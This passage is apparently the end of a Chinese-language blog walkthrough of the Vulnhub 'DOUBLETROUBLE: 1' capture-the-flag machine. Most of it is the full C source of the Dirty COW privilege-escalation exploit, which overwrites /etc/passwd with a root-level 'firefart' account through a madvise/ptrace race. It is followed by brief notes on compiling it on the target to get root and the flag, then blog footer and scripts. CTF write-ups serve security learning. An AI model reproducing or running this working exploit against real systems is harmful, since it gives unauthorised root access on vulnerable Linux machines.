*hash;</span><br><span class="line">   <span class="type">int</span> user_id;</span><br><span class="line">   <span class="type">int</span> group_id;</span><br><span class="line">   <span class="type">char</span> *info;</span><br><span class="line">   <span class="type">char</span> *home_dir;</span><br><span class="line">   <span class="type">char</span> *shell;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">char</span> *<span class="title function_">generate_password_hash</span><span class="params">(<span class="type">char</span> *plaintext_pw)</span> &#123;</span><br><span class="line">  <span class="keyword">return</span> crypt(plaintext_pw, salt);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">char</span> *<span class="title function_">generate_passwd_line</span><span class="params">(<span class="keyword">struct</span> Userinfo u)</span> &#123;</span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *format = <span class="string">&quot;%s:%s:%d:%d:%s:%s:%s\n&quot;</span>;</span><br><span class="line">  <span class="type">int</span> size = <span class="built_in">snprintf</span>(<span class="literal">NULL</span>, <span class="number">0</span>, format, u.username, u.hash,</span><br><span class="line">    u.user_id, u.group_id, u.info, u.home_dir, u.shell);</span><br><span class="line">  <span class="type">char</span> *ret = <span class="built_in">malloc</span>(size + <span class="number">1</span>);</span><br><span class="line">  <span class="built_in">sprintf</span>(ret, format, u.username, u.hash, u.user_id,</span><br><span class="line">    u.group_id, u.info, u.home_dir, u.shell);</span><br><span class="line">  <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> *<span class="title function_">madviseThread</span><span class="params">(<span class="type">void</span> *arg)</span> &#123;</span><br><span class="line">  <span class="type">int</span> i, c = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">200000000</span>; i++) &#123;</span><br><span class="line">    c += madvise(<span class="built_in">map</span>, <span class="number">100</span>, MADV_DONTNEED);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;madvise %d\n\n&quot;</span>, c);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">copy_file</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *from, <span class="type">const</span> <span class="type">char</span> *to)</span> &#123;</span><br><span class="line">  <span class="comment">// check if target file already exists</span></span><br><span class="line">  <span class="keyword">if</span>(access(to, F_OK) != <span class="number">-1</span>) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;File %s already exists! Please delete it and run again\n&quot;</span>,</span><br><span class="line">      to);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="type">char</span> ch;</span><br><span class="line">  FILE *source, *target;</span><br><span class="line"></span><br><span class="line">  source = fopen(from, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span>(source == <span class="literal">NULL</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  target = fopen(to, <span class="string">&quot;w&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span>(target == <span class="literal">NULL</span>) &#123;</span><br><span class="line">     fclose(source);</span><br><span class="line">     <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span>((ch = fgetc(source)) != EOF) &#123;</span><br><span class="line">     fputc(ch, target);</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%s successfully backed up to %s\n&quot;</span>,</span><br><span class="line">    from, to);</span><br><span class="line"></span><br><span class="line">  fclose(source);</span><br><span class="line">  fclose(target);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">// backup file</span></span><br><span class="line">  <span class="type">int</span> ret = copy_file(filename, backup_filename);</span><br><span class="line">  <span class="keyword">if</span> (ret != <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="built_in">exit</span>(ret);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">Userinfo</span> <span class="title">user</span>;</span></span><br><span class="line">  <span class="comment">// set values, change as needed</span></span><br><span class="line">  user.username = <span class="string">&quot;firefart&quot;</span>;</span><br><span class="line">  user.user_id = <span class="number">0</span>;</span><br><span class="line">  user.group_id = <span class="number">0</span>;</span><br><span class="line">  user.info = <span class="string">&quot;pwned&quot;</span>;</span><br><span class="line">  user.home_dir = <span class="string">&quot;/root&quot;</span>;</span><br><span class="line">  user.shell = <span class="string">&quot;/bin/bash&quot;</span>;</span><br><span class="line"></span><br><span class="line">  <span class="type">char</span> *plaintext_pw;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (argc &gt;= <span class="number">2</span>) &#123;</span><br><span class="line">    plaintext_pw = argv[<span class="number">1</span>];</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Please enter the new password: %s\n&quot;</span>, plaintext_pw);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    plaintext_pw = getpass(<span class="string">&quot;Please enter the new password: &quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  user.hash = generate_password_hash(plaintext_pw);</span><br><span class="line">  <span class="type">char</span> *complete_passwd_line = generate_passwd_line(user);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Complete line:\n%s\n&quot;</span>, complete_passwd_line);</span><br><span class="line"></span><br><span class="line">  f = open(filename, O_RDONLY);</span><br><span class="line">  fstat(f, &amp;st);</span><br><span class="line">  <span class="built_in">map</span> = mmap(<span class="literal">NULL</span>,</span><br><span class="line">             st.st_size + <span class="keyword">sizeof</span>(<span class="type">long</span>),</span><br><span class="line">             PROT_READ,</span><br><span class="line">             MAP_PRIVATE,</span><br><span class="line">             f,</span><br><span class="line">             <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;mmap: %lx\n&quot;</span>,(<span class="type">unsigned</span> <span class="type">long</span>)<span class="built_in">map</span>);</span><br><span class="line">  pid = fork();</span><br><span class="line">  <span class="keyword">if</span>(pid) &#123;</span><br><span class="line">    waitpid(pid, <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="type">int</span> u, i, o, c = <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> l=<span class="built_in">strlen</span>(complete_passwd_line);</span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">10000</span>/l; i++) &#123;</span><br><span class="line">      <span class="keyword">for</span>(o = <span class="number">0</span>; o &lt; l; o++) &#123;</span><br><span class="line">        <span class="keyword">for</span>(u = <span class="number">0</span>; u &lt; <span class="number">10000</span>; u++) &#123;</span><br><span class="line">          c += ptrace(PTRACE_POKETEXT,</span><br><span class="line">                      pid,</span><br><span class="line">                      <span class="built_in">map</span> + o,</span><br><span class="line">                      *((<span class="type">long</span>*)(complete_passwd_line + o)));</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;ptrace %d\n&quot;</span>,c);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> &#123;</span><br><span class="line">    pthread_create(&amp;pth,</span><br><span class="line">                   <span class="literal">NULL</span>,</span><br><span class="line">                   madviseThread,</span><br><span class="line">                   <span class="literal">NULL</span>);</span><br><span class="line">    ptrace(PTRACE_TRACEME);</span><br><span class="line">    kill(getpid(), SIGSTOP);</span><br><span class="line">    pthread_join(pth,<span class="literal">NULL</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Done! Check %s to see if the new user was created.\n&quot;</span>, filename);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;You can log in with the username &#x27;%s&#x27; and the password &#x27;%s&#x27;.\n\n&quot;</span>,</span><br><span class="line">    user.username, plaintext_pw);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\nDON&#x27;T FORGET TO RESTORE! $ mv %s %s\n&quot;</span>,</span><br><span class="line">    backup_filename, filename);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>靶机创建poc.c，用 gcc 编译并提权</p>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202310071252933.png" /></p>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202310071251343.png" /></p>
+<p>切换用户 <code>firefart/root</code>，拿到第二个 flag</p>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202310071254943.png" /></p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          
+
+<div class="post-copyright">
+<ul>
+  <li class="post-copyright-author">
+      <strong>本文作者： </strong>Ghost
+  </li>
+  <li class="post-copyright-link">
+      <strong>本文链接：</strong>
+      <a href="https://z9m8r8.github.io/2023/10/07/doubletrouble-1/" title="DOUBLETROUBLE: 1">https://z9m8r8.github.io/2023/10/07/doubletrouble-1/</a>
+  </li>
+  <li class="post-copyright-license">
+      <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+          <div class="post-tags">
+              <a href="/tags/Vulnhub-%E9%9D%B6%E5%9C%BA/" rel="tag"><i class="fa fa-tag"></i> Vulnhub 靶场</a>
+              <a href="/tags/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/" rel="tag"><i class="fa fa-tag"></i> 信息收集</a>
+              <a href="/tags/%E6%8F%90%E6%9D%83/" rel="tag"><i class="fa fa-tag"></i> 提权</a>
+              <a href="/tags/%E5%8F%8D%E5%BC%B9-shell/" rel="tag"><i class="fa fa-tag"></i> 反弹 shell</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2023/08/28/empire-breakout/" rel="prev" title="EMPIRE：BREAKOUT">
+                  <i class="fa fa-angle-left"></i> EMPIRE：BREAKOUT
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/2023/12/14/Natas/" rel="next" title="Natas">
+                  Natas <i class="fa fa-angle-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 2020 – 
+    <span itemprop="copyrightYear">2024</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">Ghost</span>
+  </div>
+<div class="wordcount">
+  <span class="post-meta-item">
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-line"></i>
+    </span>
+    <span title="站点总字数">187k</span>
+  </span>
+  <span class="post-meta-item">
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+    <span title="站点阅读时长">11:19</span>
+  </span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+  <div class="reading-progress-bar"></div>
+  <a role="button" class="book-mark-link book-mark-link-fixed"></a>
+
+  <a href="https://github.com/z9m8r8" class="github-corner" title="在 GitHub 上关注我" aria-label="在 GitHub 上关注我" rel="noopener" target="_blank"><svg width="80" height="80" viewBox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/next-theme-pjax/0.6.0/pjax.min.js" integrity="sha256-vxLn1tSKWD4dqbMRyv940UYw4sXgMtYcK6reefzZrao=" crossorigin="anonymous"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/fancyapps-ui/5.0.28/fancybox/fancybox.umd.js" integrity="sha256-ytMJGN3toR+a84u7g7NuHm91VIR06Q41kMWDr2pq7Zo=" crossorigin="anonymous"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/lozad.js/1.16.0/lozad.min.js" integrity="sha256-mOFREFhqmHeQbXpK2lp4nA3qooVgACfh88fpJftLBbc=" crossorigin="anonymous"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/pangu/4.0.7/pangu.min.js" integrity="sha256-j+yj56cdEY2CwkVtGyz18fNybFGpMGJ8JxG3GSyO2+I=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/next-boot.js"></script><script src="/js/bookmark.js"></script><script src="/js/pjax.js"></script>
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.4.1/search.js" integrity="sha256-1kfA5uHPf65M5cphT2dvymhkuyHPQp5A53EGZOnOLmc=" crossorigin="anonymous"></script>
+<script src="/js/third-party/search/local-search.js"></script>
+
+
+
+
+  <script src="/js/third-party/fancybox.js"></script>
+
+  <script src="/js/third-party/pace.js"></script>
+
+
+  
+
+
+
+
+  
+
+  <script class="next-config" data-name="enableMath" type="application/json">true</script><script class="next-config" data-name="mathjax" type="application/json">{"enable":true,"tags":"ams","js":{"url":"https://cdnjs.cloudflare.com/ajax/libs/mathjax/3.2.2/es5/tex-mml-chtml.js","integrity":"sha256-MASABpB4tYktI2Oitl4t+78w/lyA+D7b/s9GEP0JOGI="}}</script>
+<script src="/js/third-party/math/mathjax.js"></script>
+
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/quicklink/2.3.0/quicklink.umd.js" integrity="sha256-yvJQOINiH9fWemHn0vCA5lsHWJaHs6/ZmO+1Ft04SvM=" crossorigin="anonymous"></script>
+  <script class="next-config" data-name="quicklink" type="application/json">{"enable":true,"home":true,"archive":true,"delay":true,"timeout":3000,"priority":true,"url":"https://z9m8r8.github.io/2023/10/07/doubletrouble-1/"}</script>
+  <script src="/js/third-party/quicklink.js"></script>
+
+</body>
+</html>
